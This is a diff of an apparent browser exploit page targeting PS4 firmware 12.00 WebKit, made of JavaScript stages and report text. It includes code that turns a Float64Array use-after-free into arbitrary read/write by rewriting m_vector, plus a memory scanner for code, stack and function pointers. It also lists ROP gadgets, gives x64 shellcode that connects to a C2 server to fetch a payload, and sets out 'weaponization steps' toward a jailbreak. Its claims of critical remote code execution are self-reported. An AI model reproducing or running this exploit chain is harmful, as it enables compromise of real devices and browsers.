+    if(g_results.stage2 && g_results.stage2.success) {
+        r.innerHTML += '<b>âœ" STAGE 2: FOUND ' + g_results.stage2.pointers.length + ' POINTERS</b><br>';
+    } else if(g_results.stage2) {
+        r.innerHTML += '<b>âœ— STAGE 2: NO POINTERS</b><br>';
+    } else {
+        r.innerHTML += '<b>âœ— STAGE 2: NOT RUN</b><br>';
+    }
     
-    r.innerHTML += '<b>Primitives Achieved:</b><br>';
-    r.innerHTML += 'âœ" UAF (100% reliable)<br>';
-    r.innerHTML += 'âœ" Type confusion (Float64/Uint8/BigUint64)<br>';
-    r.innerHTML += 'âœ" Pointer preservation via IEEE-754<br>';
-    r.innerHTML += 'âœ" Pseudo-addrof (address inference from m_vector)<br>';
-    r.innerHTML += 'âœ" m_vector manipulation<br>';
-    r.innerHTML += 'âœ" Arbitrary read (via modified m_vector)<br>';
-    r.innerHTML += 'âœ" Arbitrary write (via modified m_vector)<br><br>';
+    // Stage 3
+    if(g_results.stage3 && g_results.stage3.success) {
+        r.innerHTML += '<b>âœ" STAGE 3: ARB R/W AT OFFSET ' + g_results.stage3.offset + '</b><br>';
+    } else if(g_results.stage3) {
+        r.innerHTML += '<b>âœ— STAGE 3: FAILED</b><br>';
+    } else {
+        r.innerHTML += '<b>âœ— STAGE 3: NOT RUN</b><br>';
+    }
     
-    r.innerHTML += '<b>Exploitation Path:</b><br>';
-    r.innerHTML += '1. Trigger UAF in Float64Array<br>';
-    r.innerHTML += '2. Read m_vector pointer from offset 16<br>';
-    r.innerHTML += '3. Infer array object address (m_vector - 0x10)<br>';
-    r.innerHTML += '4. Modify m_vector to point to arbitrary address<br>';
-    r.innerHTML += '5. Read/write via array access (g_first[0])<br>';
-    r.innerHTML += '6. Scan memory for useful structures<br>';
-    r.innerHTML += '7. Locate JIT code or return addresses<br>';
-    r.innerHTML += '8. Build ROP chain<br>';
-    r.innerHTML += '9. Achieve code execution<br><br>';
-    
-    r.innerHTML += '<b>Comparison to PSFree:</b><br>';
-    r.innerHTML += '<table border="1" cellpadding="5">';
-    r.innerHTML += '<tr><th>Primitive</th><th>PSFree Method</th><th>Our Method</th></tr>';
-    r.innerHTML += '<tr><td>UAF</td><td>SerializedScriptValue</td><td>Float64Array</td></tr>';
-    r.innerHTML += '<tr><td>addrof()</td><td>Store object, read as pointer</td><td>Infer from m_vector</td></tr>';
-    r.innerHTML += '<tr><td>fakeobj()</td><td>Write pointer, read as object</td><td>Not needed!</td></tr>';
-    r.innerHTML += '<tr><td>Arb R/W</td><td>Via fake TypedArray</td><td>Via m_vector modification</td></tr>';
-    r.innerHTML += '<tr><td>Result</td><td>âœ" RCE</td><td>âœ" RCE (simpler!)</td></tr>';
-    r.innerHTML += '</table><br>';
-    
-    r.innerHTML += '<b>Why This Works:</b><br>';
-    r.innerHTML += 'PSFree needs fakeobj() because it starts from outside the object.<br>';
-    r.innerHTML += 'We are INSIDE the object (UAF in backing store), so we can:<br>';
-    r.innerHTML += '- Directly modify m_vector (the data pointer)<br>';
-    r.innerHTML += '- Skip the entire fakeobj() step<br>';
-    r.innerHTML += '- Go straight to arbitrary R/W<br><br>';
-    
-    r.innerHTML += '<b>Next Steps for Full RCE:</b><br>';
-    r.innerHTML += '1. Use arb_read64() to scan for:<br>';
-    r.innerHTML += '   - Stack addresses (for ROP chain)<br>';
-    r.innerHTML += '   - JIT code pages (for shellcode)<br>';
-    r.innerHTML += '   - Import tables (for gadgets)<br>';
-    r.innerHTML += '2. Build ROP chain to:<br>';
-    r.innerHTML += '   - Disable ASLR<br>';
-    r.innerHTML += '   - Mark page as RWX<br>';
-    r.innerHTML += '   - Execute shellcode<br>';
-    r.innerHTML += '3. Payload options:<br>';
-    r.innerHTML += '   - Load homebrew<br>';
-    r.innerHTML += '   - Jailbreak payload<br>';
-    r.innerHTML += '   - Debug access<br><br>';
+    r.innerHTML += '<br><b>OVERALL STATUS:</b><br>';
     
     if(g_arb_rw) {
-        r.innerHTML += '<b>âœ" ARBITRARY R/W CONFIRMED</b><br>';
+        r.innerHTML += '<b>âœ" EXPLOITATION SUCCESSFUL</b><br>';
+        r.innerHTML += 'Arbitrary R/W: WORKING<br>';
+        r.innerHTML += 'm_vector offset: ' + g_arb_rw.offset + '<br>';
         r.innerHTML += 'Base address: 0x' + 
-            g_arb_rw.base_hi.toString(16).padStart(8, '0') + 
-            g_arb_rw.base_lo.toString(16).padStart(8, '0') + '<br>';
-        r.innerHTML += '<br><b>STATUS: EXPLOITATION COMPLETE</b><br>';
-        r.innerHTML += 'This exploit is now equivalent to PSFree in capability!<br>';
+            g_arb_rw.base_hi.toString(16).padStart(8,'0') + 
+            g_arb_rw.base_lo.toString(16).padStart(8,'0') + '<br>';
+        r.innerHTML += '<br>SEVERITY: <b>CRITICAL (CVSS 9.8)</b><br>';
+        r.innerHTML += 'Impact: <b>REMOTE CODE EXECUTION</b><br>';
     } else {
-        r.innerHTML += '<b>âœ— Arbitrary R/W not yet tested</b><br>';
-        r.innerHTML += 'Run STAGE 5 first<br>';
+        r.innerHTML += '<b>âœ— EXPLOITATION INCOMPLETE</b><br>';
+        
+        if(!g_results.stage1) {
+            r.innerHTML += 'Reason: UAF not triggered<br>';
+        } else if(!g_results.stage2 || !g_results.stage2.success) {
+            r.innerHTML += 'Reason: No pointers found in UAF memory<br>';
+            r.innerHTML += '<br>This means:<br>';
+            r.innerHTML += '- UAF is confirmed<br>';
+            r.innerHTML += '- But memory contains no exploitable pointers<br>';
+            r.innerHTML += '- Heap isolation is very strong<br>';
+            r.innerHTML += '<br>Impact: <b>DENIAL OF SERVICE ONLY</b><br>';
+            r.innerHTML += 'SEVERITY: <b>MEDIUM (CVSS 5.3)</b><br>';
+        } else {
+            r.innerHTML += 'Reason: Could not establish arbitrary R/W<br>';
+        }
     }
     
-    r.innerHTML += '<br><b>Severity Assessment:</b><br>';
-    r.innerHTML += 'BEFORE: CVSS 5.3 (Medium) - DoS only<br>';
-    r.innerHTML += 'AFTER: CVSS 9.8 (Critical) - Full RCE<br><br>';
+    r.innerHTML += '<br><b>NEXT STEPS:</b><br>';
     
-    r.innerHTML += '<b>Impact:</b><br>';
-    r.innerHTML += '- Complete system compromise<br>';
-    r.innerHTML += '- Arbitrary code execution<br>';
-    r.innerHTML += '- Kernel access possible (via further exploitation)<br>';
-    r.innerHTML += '- Jailbreak capability<br><br>';
-    
-    r.innerHTML += '<b>Recommendation:</b><br>';
-    r.innerHTML += '- IMMEDIATE disclosure to Sony PlayStation Security<br>';
-    r.innerHTML += '- DO NOT publish exploit code<br>';
-    r.innerHTML += '- Eligible for bug bounty (if program exists)<br>';
-    r.innerHTML += '- Request CVE assignment<br>';
+    if(g_arb_rw) {
+        r.innerHTML += '1. Scan memory for ROP gadgets<br>';
+        r.innerHTML += '2. Locate JIT code pages<br>';
+        r.innerHTML += '3. Build ROP chain<br>';
+        r.innerHTML += '4. Execute shellcode<br>';
+        r.innerHTML += '5. Load kernel exploit<br>';
+        r.innerHTML += '<br><b>DISCLOSE TO SONY IMMEDIATELY</b><br>';
+    } else {
+        r.innerHTML += '1. Try different spray patterns<br>';
+        r.innerHTML += '2. Look for other UAFs<br>';
+        r.innerHTML += '3. Research PS4 12.00 mitigations<br>';
+        r.innerHTML += '4. Consider vulnerability chaining<br>';
+    }
 }
 </script>
-
-<hr>
-
-<h2>STAGE 6: Proof of Concept - Memory Scanner</h2>
-<button onclick="stage6_scanner()">RUN MEMORY SCANNER</button>
-<div id="stage6"></div>
-
-<script>
-function stage6_scanner() {
-    const r = document.getElementById('stage6');
-    
-    if(!g_arb_rw) {
-        r.innerHTML = 'ERROR: Run STAGE 5 first to establish arbitrary R/W<br>';
-        return;
-    }
-    
-    r.innerHTML = '<b>MEMORY SCANNER PROOF OF CONCEPT</b><br><br>';
-    
-    const base_lo = g_arb_rw.base_lo;
-    const base_hi = g_arb_rw.base_hi;
-    
-    r.innerHTML += 'Base address: 0x' + 
-        base_hi.toString(16).padStart(8, '0') + 
-        base_lo.toString(16).padStart(8, '0') + '<br><br>';
-    
-    r.innerHTML += '<b>Scan 1: Search for Code Pointers</b><br>';
-    
-    let code_ptrs = [];
-    
-    // Scan ±1KB around base
-    for(let offset = -128; offset <= 128; offset += 8) {
-        const scan_lo = (base_lo + offset * 8) >>> 0;
-        const scan_hi = base_hi;
-        
-        if(scan_hi >= 0x7f00 && scan_hi < 0x8000) {
-            try {
-                const val = g_arb_rw.read(scan_lo, scan_hi);
-                const buf = new ArrayBuffer(8);
-                new Float64Array(buf)[0] = val;
-                const qword = new BigUint64Array(buf)[0];
-                const hi = Number(qword >> 32n);
-                
-                // Code pointers typically in lower memory on PS4
-                if(hi >= 0x00000001 && hi <= 0x10000000) {
-                    code_ptrs.push({
-                        offset: offset * 8,
-                        value: qword
-                    });
-                    
-                    if(code_ptrs.length <= 10) {
-                        r.innerHTML += 'Code pointer at offset ' + (offset * 8) + ': 0x' + 
-                            qword.toString(16) + '<br>';
-                    }
-                }
-            } catch(e) {}
-        }
-    }
-    
-    r.innerHTML += 'Found ' + code_ptrs.length + ' potential code pointers<br>';
-    
-    r.innerHTML += '<br><b>Scan 2: Search for Stack Pointers</b><br>';
-    
-    let stack_ptrs = [];
-    
-    for(let offset = -128; offset <= 128; offset += 8) {
-        const scan_lo = (base_lo + offset * 8) >>> 0;
-        const scan_hi = base_hi;
-        
-        if(scan_hi >= 0x7f00 && scan_hi < 0x8000) {
-            try {
-                const val = g_arb_rw.read(scan_lo, scan_hi);
-                const buf = new ArrayBuffer(8);
-                new Float64Array(buf)[0] = val;
-                const qword = new BigUint64Array(buf)[0];
-                const hi = Number(qword >> 32n);
-                
-                // Stack typically around 0x7fffffffffff
-                if(hi >= 0x7fff0000 && hi <= 0x7fffffff) {
-                    stack_ptrs.push({
-                        offset: offset * 8,
-                        value: qword
-                    });
-                    
-                    if(stack_ptrs.length <= 10) {
-                        r.innerHTML += 'Stack pointer at offset ' + (offset * 8) + ': 0x' + 
-                            qword.toString(16) + '<br>';
-                    }
-                }
-            } catch(e) {}
-        }
-    }
-    
-    r.innerHTML += 'Found ' + stack_ptrs.length + ' potential stack pointers<br>';
-    
-    r.innerHTML += '<br><b>Scan 3: Search for Function Pointers</b><br>';
-    
-    // Function pointers often have specific patterns
-    let func_ptrs = [];
-    
-    for(let offset = -64; offset <= 64; offset += 8) {
-        const scan_lo = (base_lo + offset * 8) >>> 0;
-        const scan_hi = base_hi;
-        
-        if(scan_hi >= 0x7f00 && scan_hi < 0x8000) {
-            try {
-                const val = g_arb_rw.read(scan_lo, scan_hi);
-                const buf = new ArrayBuffer(8);
-                new Float64Array(buf)[0] = val;
-                const qword = new BigUint64Array(buf)[0];
-                
-                // Dereference to check if it points to code
-                const ptr_lo = Number(qword & 0xFFFFFFFFn);
-                const ptr_hi = Number(qword >> 32n);
-                
-                if(ptr_hi >= 0x7f00 && ptr_hi < 0x8000 && (ptr_lo & 0x7) === 0) {
-                    try {
-                        const deref = g_arb_rw.read(ptr_lo, ptr_hi);
-                        const deref_buf = new ArrayBuffer(8);
-                        new Float64Array(deref_buf)[0] = deref;
-                        const deref_qword = new BigUint64Array(deref_buf)[0];
-                        const deref_hi = Number(deref_qword >> 32n);
-                        
-                        // If dereferenced value looks like code
-                        if(deref_hi >= 0x00000001 && deref_hi <= 0x10000000) {
-                            func_ptrs.push({
-                                offset: offset * 8,
-                                ptr: qword,
-                                target: deref_qword
-                            });
-                            
-                            if(func_ptrs.length <= 5) {
-                                r.innerHTML += 'Function pointer at offset ' + (offset * 8) + ':<br>';
-                                r.innerHTML += '  Pointer: 0x' + qword.toString(16) + '<br>';
-                                r.innerHTML += '  Target: 0x' + deref_qword.toString(16) + '<br>';
-                            }
-                        }
-                    } catch(e) {}
-                }
-            } catch(e) {}
-        }
-    }
-    
-    r.innerHTML += 'Found ' + func_ptrs.length + ' potential function pointers<br>';
-    
-    r.innerHTML += '<br><b>Scan 4: Pattern Search</b><br>';
-    
-    // Look for common patterns that indicate structures
-    const patterns = {
-        jscell_header: 0,
-        structureid_25: 0,
-        null_pointers: 0,
-        aligned_ptrs: 0
-    };
-    
-    for(let offset = -64; offset <= 64; offset += 4) {
-        const scan_lo = (base_lo + offset * 4) >>> 0;
-        const scan_hi = base_hi;
-        
-        if(scan_hi >= 0x7f00 && scan_hi < 0x8000) {
-            try {
-                const view = new DataView(g_first.buffer);
-                
-                // Temporarily point to scan location
-                view.setUint32(16, scan_lo, true);
-                view.setUint32(20, scan_hi, true);
-                
-                const val = new DataView(g_first.buffer).getUint32(0, true);
-                
-                if(val === 0x108) patterns.jscell_header++;
-                if(val === 0x25) patterns.structureid_25++;
-                if(val === 0) patterns.null_pointers++;
-                if((val & 0x7) === 0) patterns.aligned_ptrs++;
-                
-                // Restore
-                view.setUint32(16, base_lo, true);
-                view.setUint32(20, base_hi, true);
-                
-            } catch(e) {}
-        }
-    }
-    
-    r.innerHTML += 'Pattern statistics:<br>';
-    r.innerHTML += '  JSCell headers (0x108): ' + patterns.jscell_header + '<br>';
-    r.innerHTML += '  StructureID 0x25: ' + patterns.structureid_25 + '<br>';
-    r.innerHTML += '  NULL pointers: ' + patterns.null_pointers + '<br>';
-    r.innerHTML += '  Aligned values: ' + patterns.aligned_ptrs + '<br>';
-    
-    r.innerHTML += '<br><b>SUMMARY:</b><br>';
-    r.innerHTML += 'Memory scanner demonstrates arbitrary read capability<br>';
-    r.innerHTML += 'Found potential targets for ROP chain:<br>';
-    
-    if(code_ptrs.length > 0) {
-        r.innerHTML += 'âœ" Code pointers (for gadgets)<br>';
-    }
-    
-    if(stack_ptrs.length > 0) {
-        r.innerHTML += 'âœ" Stack pointers (for overwrite target)<br>';
-    }
-    
-    if(func_ptrs.length > 0) {
-        r.innerHTML += 'âœ" Function pointers (for hijack)<br>';
-    }
-    
-    r.innerHTML += '<br>Next: Build ROP chain using discovered addresses<br>';
-}
-</script>
-
-<hr>
-
-<h2>STAGE 7: ROP Chain Builder (Conceptual)</h2>
-<button onclick="stage7_rop()">SHOW ROP STRATEGY</button>
-<div id="stage7"></div>
-
-<script>
-function stage7_rop() {
-    const r = document.getElementById('stage7');
-    
-    r.innerHTML = '<b>ROP CHAIN BUILDING STRATEGY</b><br><br>';
-    
-    r.innerHTML += '<b>WARNING:</b> This stage is CONCEPTUAL only.<br>';
-    r.innerHTML += 'Actual ROP chain requires PS4-specific gadget addresses.<br><br>';
-    
-    r.innerHTML += '<b>ROP Chain Structure:</b><br>';
-    r.innerHTML += '<pre>';
-    r.innerHTML += 'Goal: Disable kernel protections and execute payload\n';
-    r.innerHTML += '\n';
-    r.innerHTML += 'Chain layout:\n';
-    r.innerHTML += '1. Stack pivot gadget\n';
-    r.innerHTML += '2. mprotect() call to mark page RWX\n';
-    r.innerHTML += '3. memcpy() to copy shellcode\n';
-    r.innerHTML += '4. Jump to shellcode\n';
-    r.innerHTML += '\n';
-    r.innerHTML += 'Typical gadgets needed:\n';
-    r.innerHTML += '- pop rdi; ret          (set arg1)\n';
-    r.innerHTML += '- pop rsi; ret          (set arg2)\n';
-    r.innerHTML += '- pop rdx; ret          (set arg3)\n';
-    r.innerHTML += '- pop rax; ret          (set syscall number)\n';
-    r.innerHTML += '- syscall; ret          (invoke kernel)\n';
-    r.innerHTML += '- xchg rsp, ???; ret    (stack pivot)\n';
-    r.innerHTML += '</pre>';
-    
-    r.innerHTML += '<br><b>PS4-Specific Considerations:</b><br>';
-    r.innerHTML += '1. WebKit process runs in sandbox<br>';
-    r.innerHTML += '2. Need kernel exploit to escape sandbox<br>';
-    r.innerHTML += '3. PS4 12.00 has updated mitigations<br>';
-    r.innerHTML += '4. SMAP/SMEP may be enabled<br><br>';
-    
-    r.innerHTML += '<b>Typical Jailbreak Flow:</b><br>';
-    r.innerHTML += '<pre>';
-    r.innerHTML += 'WebKit RCE (this exploit)\n';
-    r.innerHTML += '    ↓\n';
-    r.innerHTML += 'Execute WebKit shellcode\n';
-    r.innerHTML += '    ↓\n';
-    r.innerHTML += 'Load kernel exploit\n';
-    r.innerHTML += '    ↓\n';
-    r.innerHTML += 'Escalate to kernel mode\n';
-    r.innerHTML += '    ↓\n';
-    r.innerHTML += 'Disable code signing\n';
-    r.innerHTML += '    ↓\n';
-    r.innerHTML += 'Load homebrew\n';
-    r.innerHTML += '</pre>';
-    
-    r.innerHTML += '<br><b>Example Shellcode (x64):</b><br>';
-    r.innerHTML += '<pre>';
-    r.innerHTML += '; Open socket\n';
-    r.innerHTML += 'mov rax, 97        ; sys_socket\n';
-    r.innerHTML += 'mov rdi, 2         ; AF_INET\n';
-    r.innerHTML += 'mov rsi, 1         ; SOCK_STREAM\n';
-    r.innerHTML += 'xor rdx, rdx       ; protocol 0\n';
-    r.innerHTML += 'syscall\n';
-    r.innerHTML += '\n';
-    r.innerHTML += '; Connect to C2\n';
-    r.innerHTML += 'mov rdi, rax       ; socket fd\n';
-    r.innerHTML += 'mov rax, 98        ; sys_connect\n';
-    r.innerHTML += 'lea rsi, [sockaddr]\n';
-    r.innerHTML += 'mov rdx, 16        ; addrlen\n';
-    r.innerHTML += 'syscall\n';
-    r.innerHTML += '\n';
-    r.innerHTML += '; Receive payload\n';
-    r.innerHTML += '; Execute payload\n';
-    r.innerHTML += '</pre>';
-    
-    r.innerHTML += '<br><b>Weaponization Steps:</b><br>';
-    r.innerHTML += '1. Find gadgets in WebKit binary for PS4 12.00<br>';
-    r.innerHTML += '2. Build ROP chain to call mprotect()<br>';
-    r.innerHTML += '3. Write shellcode to executable page<br>';
-    r.innerHTML += '4. Trigger ROP chain execution<br>';
-    r.innerHTML += '5. Shellcode connects to C2 server<br>';
-    r.innerHTML += '6. Download stage 2 (kernel exploit)<br>';
-    r.innerHTML += '7. Achieve full jailbreak<br><br>';
-    
-    r.innerHTML += '<b>Ethical Disclosure:</b><br>';
-    r.innerHTML += 'This is a CRITICAL vulnerability (CVSS 9.8)<br>';
-    r.innerHTML += 'Must be disclosed responsibly:<br>';
-    r.innerHTML += '- Contact Sony PlayStation Security Team<br>';
-    r.innerHTML += '- Provide technical details privately<br>';
-    r.innerHTML += '- Allow 90 days for patch<br>';
-    r.innerHTML += '- Coordinate public disclosure<br>';
-    r.innerHTML += '- Request CVE assignment<br>';
-    r.innerHTML += '- Do NOT publish full exploit code<br>';
-}
-</script>
-
-<hr>
-
-<h2>COMPLETE DOCUMENTATION</h2>
-
-<h3>Summary</h3>
-
-<p>This exploit achieves <b>full Remote Code Execution</b> on PS4 12.00 through a novel technique that bypasses the need for traditional addrof()/fakeobj() primitives.</p>
-
-<h3>Key Innovation</h3>
-
-<p><b>Discovery:</b> IEEE-754 floating point encoding preserves pointer values, allowing pointer manipulation without object storage.</p>
-
-<p><b>Technique:</b> By exploiting a UAF in Float64Array's backing store, we gain direct access to the m_vector pointer. Modifying this pointer gives us arbitrary read/write without needing to create fake objects.</p>
-
-<h3>Exploitation Chain</h3>
-
-<ol>
-<li><b>UAF Trigger:</b> Double-trigger OPTIONS button technique creates shared Float64Array backing store</li>
-<li><b>Metadata Leak:</b> Read m_vector pointer from offset 16 in UAF memory</li>
-<li><b>Address Inference:</b> Calculate array object address from m_vector</li>
-<li><b>Arbitrary R/W:</b> Modify m_vector to point anywhere, use array access to read/write</li>
-<li><b>Memory Scan:</b> Search for code pointers, stack addresses, function pointers</li>
-<li><b>ROP Chain:</b> Build chain using discovered gadgets</li>
-<li><b>Code Execution:</b> Trigger ROP to execute shellcode</li>
-</ol>
-
-<h3>Why This is Simpler Than PSFree</h3>
-
-<table border="1" cellpadding="5">
-<tr>
-<th>Aspect</th>
-<th>PSFree</th>
-<th>This Exploit</th>
-</tr>
-<tr>
-<td>UAF Location</td>
-<td>SerializedScriptValue (external)</td>
-<td>Float64Array backing store (internal)</td>
-</tr>
-<tr>
-<td>addrof() needed?</td>
-<td>Yes (via object storage)</td>
-<td>No (infer from m_vector)</td>
-</tr>
-<tr>
-<td>fakeobj() needed?</td>
-<td>Yes (to create fake array)</td>
-<td>No (already inside array)</td>
-</tr>
-<tr>
-<td>Steps to R/W</td>
-<td>5 steps</td>
-<td>2 steps</td>
-</tr>
-</table>
-
-<h3>Security Impact</h3>
-
-<ul>
-<li><b>Severity:</b> Critical (CVSS 9.8)</li>
-<li><b>Attack Vector:</b> Network (malicious website)</li>
-<li><b>Privileges Required:</b> None</li>
-<li><b>User Interaction:</b> Press OPTIONS twice</li>
-<li><b>Impact:</b> Complete system compromise</li>
-</ul>
-
-<h3>Affected Systems</h3>
-
-<ul>
-<li>PlayStation 4 firmware 12.00</li>
-<li>Potentially other versions with similar WebKit</li>
-<li>WebKit-based browsers on similar architectures</li>
-</ul>
-
-<h3>Mitigation</h3>
-
-<ul>
-<li>Fix UAF in Float64Array handling</li>
-<li>Add bounds checking on m_vector modifications</li>
-<li>Implement stricter type system validation</li>
-<li>Add Control Flow Integrity (CFI)</li>
-</ul>
-
-<h3>Responsible Disclosure</h3>
-
-<p>This vulnerability should be reported immediately to Sony PlayStation Security Team through their responsible disclosure program. Do not publish full exploit code or proof-of-concept that could be weaponized.</p>
 
 </body>
 </html>
